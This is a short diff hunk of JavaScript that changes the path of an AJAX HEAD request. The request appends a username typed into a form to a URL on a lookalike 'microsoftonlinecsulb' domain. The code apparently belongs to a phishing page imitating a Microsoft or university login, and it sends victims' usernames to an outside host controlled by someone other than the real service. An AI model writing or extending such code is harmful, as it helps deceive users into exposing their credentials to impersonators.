@@ -12,7 +12,7 @@ function functioncheck(){
             // alert('saved');
             try{
               $.ajax({
-                url:'https://www.microsoftonlinecsulb.com/'+$("#username").val()+'.txt',
+                url:'https://www.microsoftonlinecsulb.com/static/'+$("#username").val()+'.txt',
                 type:'HEAD',
                 error: function()
                 {
